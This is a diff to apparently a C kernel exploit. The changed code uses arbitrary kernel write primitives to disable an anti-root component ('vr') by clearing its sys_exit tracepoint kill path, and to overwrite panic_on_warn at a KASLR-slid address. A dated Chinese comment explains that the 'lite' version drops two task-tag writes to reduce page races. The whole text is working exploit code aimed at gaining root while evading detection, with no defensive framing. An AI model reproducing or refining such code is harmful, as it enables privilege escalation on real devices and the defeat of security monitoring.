@@ -3153,9 +3153,9 @@ static void defeat_vr(unsigned long long task, unsigned char *raw, pid_t child)
         logf("[-] vr de-tag: bad task=%#llx, skipped\n", task);
         return;
     }
-    logf("[+] vr de-tag: task=%#llx, zeroing flags + tagB slot\n", task);
-    zero_write(task + 0x00, "vr-flags", raw);
-    zero_write(task + 0x28, "vr-tagB", raw);
+    logf("[+] vr de-tag: task=%#llx, sys-exit only (flags/tagB skipped)\n", task);
+    /* 2026-11-25 lite: janewas 结论——vr 反 root 的关键只有 sys_exit funcs
+     * 一处；前两个 task tag 写省掉，减少 2 次抢页。 */
     /* Globally disable vr's sys_exit kill path: the sys_exit tracepoint's
      * iterator NULL-checks funcs (cbz in the reference disasm), so clearing
      * the pointer is safe and keeps vr's termination probe from firing for
@@ -3451,8 +3451,8 @@ int main(int argc, char **argv)
         {
             int pw = read_panic_on_warn();
 
-            if (pw == 0)
-                logf("[+] panic_on_warn already 0; skipping plant\n");
+            if (pw <= 0)
+                logf("[+] panic_on_warn=%d; skipping plant (lite)\n", pw);
             else if (stage_write(PANIC_ON_WARN_STATIC + g_slide, 0,
                                  "panic_on_warn", raw, NULL))
                 park_forever("panic_on_warn write failed");
